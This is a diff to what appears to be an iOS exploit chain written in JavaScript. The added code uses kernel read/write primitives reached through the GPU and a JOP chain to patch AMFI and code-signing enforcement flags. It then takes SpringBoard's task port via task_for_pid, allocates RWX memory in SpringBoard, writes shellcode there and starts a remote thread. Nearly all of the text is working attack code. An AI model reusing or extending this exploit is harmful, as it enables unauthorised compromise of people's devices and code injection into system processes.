@@ -7700,6 +7700,89 @@
       }
     }
 
+    // ===== A2: AMFI bypass via GPU uwrite64 (inside spawn_pe while JOP chain is healthy) =====
+    // The JOP chain (mpd_fcall/mpd_read64) is reliable BEFORE pe_main is dispatched.
+    // After mpd_evaluateScript_nowait, the JOP chain hangs — A2 must run here.
+    LOG("[A2] Starting AMFI bypass (before pe_main dispatch)...");
+    let a2_inside_success = false;
+    let a2_sb_port = 0n;
+    let tfp_sym = tfp_raw_local.noPAC();
+    if (tfp_sym != 0n) {
+      // Approach 1: cs_enforcement_disable
+      let csed_addr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "cs_enforcement_disable");
+      LOG(`[A2] gpuDlsym(cs_enforcement_disable) = ${csed_addr.hex()}`);
+      if (csed_addr.noPAC() != 0n) {
+        let kc_addr = csed_addr.noPAC();
+        let cur_gpu = uread64(kc_addr);
+        LOG(`[A2] cs_enforcement_disable current (GPU) = ${cur_gpu.hex()}`);
+        if (cur_gpu == 0n) {
+          uwrite64(kc_addr, 1n);
+          let after_gpu = uread64(kc_addr);
+          LOG(`[A2] After GPU write: ${after_gpu.hex()}`);
+          if (after_gpu != 0n) {
+            LOG("[A2] cs_enforcement_disable PATCHED via GPU");
+          } else {
+            LOG("[A2] GPU write failed (COW? or invalid address)");
+          }
+        } else {
+          LOG("[A2] cs_enforcement_disable already non-zero");
+        }
+      }
+
+      // Approach 2: amfi_get_out_of_my_way
+      let agoomw_addr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "amfi_get_out_of_my_way");
+      LOG(`[A2] gpuDlsym(amfi_get_out_of_my_way) = ${agoomw_addr.hex()}`);
+      if (agoomw_addr.noPAC() != 0n) {
+        let kc_addr = agoomw_addr.noPAC();
+        let cur_gpu = uread64(kc_addr);
+        LOG(`[A2] amfi_get_out_of_my_way current (GPU) = ${cur_gpu.hex()}`);
+        if (cur_gpu == 0n) {
+          uwrite64(kc_addr, 1n);
+          let after_gpu = uread64(kc_addr);
+          LOG(`[A2] After GPU write: ${after_gpu.hex()}`);
+          if (after_gpu != 0n) {
+            LOG("[A2] amfi_get_out_of_my_way PATCHED via GPU");
+          }
+        } else {
+          LOG("[A2] amfi_get_out_of_my_way already non-zero");
+        }
+      }
+
+      // Approach 3: amfi_flags
+      let af_addr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "amfi_flags");
+      LOG(`[A2] gpuDlsym(amfi_flags) = ${af_addr.hex()}`);
+      if (af_addr.noPAC() != 0n) {
+        let kc_addr = af_addr.noPAC();
+        let cur_gpu = uread64(kc_addr);
+        LOG(`[A2] amfi_flags current (GPU) = ${cur_gpu.hex()}`);
+        uwrite64(kc_addr, cur_gpu | 1n);
+        let after_gpu = uread64(kc_addr);
+        LOG(`[A2] After GPU write: ${after_gpu.hex()}`);
+      }
+
+      // Test: task_for_pid(34) via mpd_fcall
+      LOG("[A2] Testing task_for_pid(34) after AMFI patching...");
+      let mpd_task_self = 0x203n;
+      let a2_sb_port_buf = mpd_malloc(8n);
+      mpd_write64(a2_sb_port_buf, 0n);
+      let a2_tfp_ret = mpd_fcall_timeout(tfp_sym, mpd_task_self, 34n, a2_sb_port_buf, 0n, 0n, 0n, 0n, 0n);
+      LOG(`[A2] task_for_pid(34) = ${a2_tfp_ret}`);
+      if (a2_tfp_ret == 0n) {
+        a2_sb_port = mpd_read64(a2_sb_port_buf);
+        LOG(`[A2] SpringBoard task port = ${a2_sb_port.hex()}`);
+        if (a2_sb_port != 0n) {
+          a2_inside_success = true;
+          // Store in IOSurface for M6/M7 to pick up
+          uwrite64(surface_address + 0xF880n, a2_sb_port);
+          LOG("[A2] SUCCESS: SpringBoard task port obtained via AMFI patch!");
+        }
+      } else {
+        LOG(`[A2] task_for_pid(34) failed (ret=${a2_tfp_ret}), GPU patching may have COW issue`);
+      }
+    } else {
+      LOG("[A2] task_for_pid symbol not available");
+    }
+
     // ===== M5: Option 2 — try to bypass task_for_pid entitlement =====
     // Resolve task_for_pid for these tests
     let tfp_raw_local = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "task_for_pid");
@@ -8022,32 +8105,37 @@
       uwrite64(surface_address + 0xF858n, -1n);
     }
 
-    // Use nowait evaluate + IOSurface log polling (bypasses mpd_fcall issues)
-    LOG("[MPD] Evaluating pe_main (nowait)...");
-    mpd_evaluateScript_nowait(ctx, pe_main_cfstring);
-    LOG("[MPD] pe_main dispatched, polling IOSurface log area...");
-    let s_log_base = surface_address + 0xF000n;
-    let s_off_addr = s_log_base + 0xE00n;
+    // If A2 already got SpringBoard task port, skip pe_main dispatch to preserve JOP chain
     let s_log = "";
-    let total_wait = 0;
-    while (total_wait < 30000) {
-      // First read write offset from IOSurface (8 bytes, little-endian)
-      let b0 = uread8(s_off_addr);
-      let b1 = uread8(s_off_addr + 1n);
-      let b2 = uread8(s_off_addr + 2n);
-      let b3 = uread8(s_off_addr + 3n);
-      let b4 = uread8(s_off_addr + 4n);
-      let b5 = uread8(s_off_addr + 5n);
-      let b6 = uread8(s_off_addr + 6n);
-      let b7 = uread8(s_off_addr + 7n);
-      let log_off = BigInt(b0) | (BigInt(b1) << 8n) | (BigInt(b2) << 16n) | (BigInt(b3) << 24n)
-                  | (BigInt(b4) << 32n) | (BigInt(b5) << 40n) | (BigInt(b6) << 48n) | (BigInt(b7) << 56n);
-      if (log_off > 0n && log_off < 0xE00n) {
-        s_log = "";
-        for (let i = 0n; i < log_off; i++) {
-          let ch = uread8(s_log_base + i);
-          if (ch === 0n) break;
-          s_log += String.fromCharCode(Number(ch));
+    if (a2_inside_success) {
+      LOG("[MPD] A2 already succeeded, skipping pe_main dispatch");
+    } else {
+      // Use nowait evaluate + IOSurface log polling (bypasses mpd_fcall issues)
+      LOG("[MPD] Evaluating pe_main (nowait)...");
+      mpd_evaluateScript_nowait(ctx, pe_main_cfstring);
+      LOG("[MPD] pe_main dispatched, polling IOSurface log area...");
+      let s_log_base = surface_address + 0xF000n;
+      let s_off_addr = s_log_base + 0xE00n;
+      s_log = "";
+      let total_wait = 0;
+      while (total_wait < 30000) {
+        // First read write offset from IOSurface (8 bytes, little-endian)
+        let b0 = uread8(s_off_addr);
+        let b1 = uread8(s_off_addr + 1n);
+        let b2 = uread8(s_off_addr + 2n);
+        let b3 = uread8(s_off_addr + 3n);
+        let b4 = uread8(s_off_addr + 4n);
+        let b5 = uread8(s_off_addr + 5n);
+        let b6 = uread8(s_off_addr + 6n);
+        let b7 = uread8(s_off_addr + 7n);
+        let log_off = BigInt(b0) | (BigInt(b1) << 8n) | (BigInt(b2) << 16n) | (BigInt(b3) << 24n)
+                    | (BigInt(b4) << 32n) | (BigInt(b5) << 40n) | (BigInt(b6) << 48n) | (BigInt(b7) << 56n);
+        if (log_off > 0n && log_off < 0xE00n) {
+          s_log = "";
+          for (let i = 0n; i < log_off; i++) {
+            let ch = uread8(s_log_base + i);
+            if (ch === 0n) break;
+            s_log += String.fromCharCode(Number(ch));
         }
         LOG(`[MPD] IOSURF PE LOG (${log_off}b): ${s_log}`);
         if (s_log.indexOf("DONE") >= 0 || s_log.indexOf("getpid()=") >= 0) break;
@@ -8057,24 +8145,30 @@
       if (total_wait > 0 && total_wait % 5000 < 200) {
         LOG(`[MPD] IOSurface poll: ${total_wait}ms elapsed, log_off=${log_off}`);
       }
+      }
     }
     if (!s_log) LOG("[MPD] IOSURF PE log: empty after timeout");
 
-    // Read PE logs from shared buffer
-    LOG("[MPD] Reading PE logs from buffer...");
-    let pe_log_offset = mpd_read64(pe_log_buf_off);
-    LOG(`[MPD] PE log offset: ${pe_log_offset}`);
-    if (pe_log_offset > 0n) {
-      let pe_log_text = "";
-      let max_read = pe_log_offset < 4000n ? pe_log_offset : 4000n;
-      for (let i = 0n; i < max_read; i++) {
-        let ch = mpd_read8(pe_log_buf + i);
-        if (ch === 0) { pe_log_text += "\\0"; continue; }
-        pe_log_text += String.fromCharCode(Number(ch));
+    // Skip pe_log_buf read if A2 already succeeded (JOP chain still healthy)
+    if (!a2_inside_success) {
+      // Read PE logs from shared buffer
+      LOG("[MPD] Reading PE logs from buffer...");
+      let pe_log_offset = mpd_read64(pe_log_buf_off);
+      LOG(`[MPD] PE log offset: ${pe_log_offset}`);
+      if (pe_log_offset > 0n) {
+        let pe_log_text = "";
+        let max_read = pe_log_offset < 4000n ? pe_log_offset : 4000n;
+        for (let i = 0n; i < max_read; i++) {
+          let ch = mpd_read8(pe_log_buf + i);
+          if (ch === 0) { pe_log_text += "\\0"; continue; }
+          pe_log_text += String.fromCharCode(Number(ch));
+        }
+        LOG(`[MPD] PE LOG: ${pe_log_text}`);
+      } else {
+        LOG("[MPD] PE log buffer is empty - PE may not have executed print() or fcall_init() failed");
       }
-      LOG(`[MPD] PE LOG: ${pe_log_text}`);
     } else {
-      LOG("[MPD] PE log buffer is empty - PE may not have executed print() or fcall_init() failed");
+      LOG("[MPD] Skipping pe_log_buf read (A2 already succeeded)");
     }
     // Note: PE logs cannot be read after nowait_exit because MPD fcall mechanism
     // may be affected. PE runs independently in MPD process.
@@ -8199,6 +8293,53 @@
   if (sbx1sbx1_succeeded) {
     spawn_pe();
     mpd_exfiltrate();
+
+    // Check if A2 inside spawn_pe already got SpringBoard task port
+    let a2_sb_port = uread64(surface_address + 0xF880n);
+    if (a2_sb_port != 0n && a2_sb_port != -1n) {
+      LOG(`[M6] A2 inside spawn_pe already got SB task port: ${a2_sb_port.hex()}`);
+      // Skip directly to M6/M7 injection
+      let mach_vm_allocate_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_allocate");
+      let mach_vm_write_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_write");
+      let mach_vm_protect_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_protect");
+      let thread_create_running_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "thread_create_running");
+      LOG(`[M6] mach_vm_allocate=${mach_vm_allocate_raw.hex()} mach_vm_write=${mach_vm_write_raw.hex()}`);
+      if (mach_vm_allocate_raw != 0n && mach_vm_write_raw != 0n) {
+        let alloc_addr_buf = mpd_malloc(8n);
+        mpd_write64(alloc_addr_buf, 0n);
+        const VM_FLAGS_ANYWHERE = 1n;
+        const VM_PROT_ALL = 0x7n;
+        let vm_alloc_ret = mpd_fcall_timeout(mach_vm_allocate_raw.noPAC(), a2_sb_port, alloc_addr_buf, 0x4000n, VM_FLAGS_ANYWHERE, 0n, 0n, 0n, 0n);
+        let sb_remote_addr = mpd_read64(alloc_addr_buf);
+        LOG(`[M6-A2] mach_vm_allocate = ${vm_alloc_ret} addr=${sb_remote_addr.hex()}`);
+        if (vm_alloc_ret == 0n && sb_remote_addr != 0n) {
+          let shellcode_addr = mpd_malloc(8n);
+          mpd_write64(shellcode_addr, 0xD65F03C014000000n); // ret then b #0
+          let vm_write_ret = mpd_fcall_timeout(mach_vm_write_raw.noPAC(), a2_sb_port, sb_remote_addr, shellcode_addr, 8n, 0n, 0n, 0n, 0n);
+          LOG(`[M6-A2] mach_vm_write = ${vm_write_ret}`);
+          if (mach_vm_protect_raw != 0n) {
+            let vm_prot_ret = mpd_fcall_timeout(mach_vm_protect_raw.noPAC(), a2_sb_port, sb_remote_addr, 0x4000n, 0n, VM_PROT_ALL, 0n, 0n, 0n);
+            LOG(`[M6-A2] mach_vm_protect(rwx) = ${vm_prot_ret}`);
+          }
+          uwrite64(surface_address + 0xF878n, sb_remote_addr);
+          uwrite64(surface_address + 0xF880n, a2_sb_port);
+          LOG("[M6-A2] SpringBoard injection prepared");
+
+          // ===== M7: Create remote thread =====
+          if (thread_create_running_raw != 0n) {
+            let thread_port_buf = mpd_malloc(8n);
+            mpd_write64(thread_port_buf, 0n);
+            let thread_ret = mpd_fcall_timeout(thread_create_running_raw.noPAC(), a2_sb_port, sb_remote_addr, 0n, thread_port_buf, 0n, 0n, 0n, 0n);
+            let sb_thread_port = mpd_read64(thread_port_buf);
+            LOG(`[M7-A2] thread_create_running = ${thread_ret} thread_port=${sb_thread_port.hex()}`);
+            if (thread_ret == 0n) {
+              LOG("[M7-A2] SUCCESS: Remote thread created in SpringBoard!");
+              uwrite64(surface_address + 0xF888n, sb_thread_port);
+            }
+          }
+        }
+      }
+    } else {
     // M2: Test kernel task traversal
     let sb_task = ktask_find_by_name("SpringBoard");
     LOG("[M2] SpringBoard task = " + sb_task.hex());
@@ -8399,6 +8540,7 @@
     } else {
       LOG("[M6] SpringBoard task NOT found, injection skipped");
     }
+    } // end else (A2 fast path check)
   }
   LOG("closing remaker_connection: " + remaker_connection);
   LOG("Before xpc_connection_cancel");
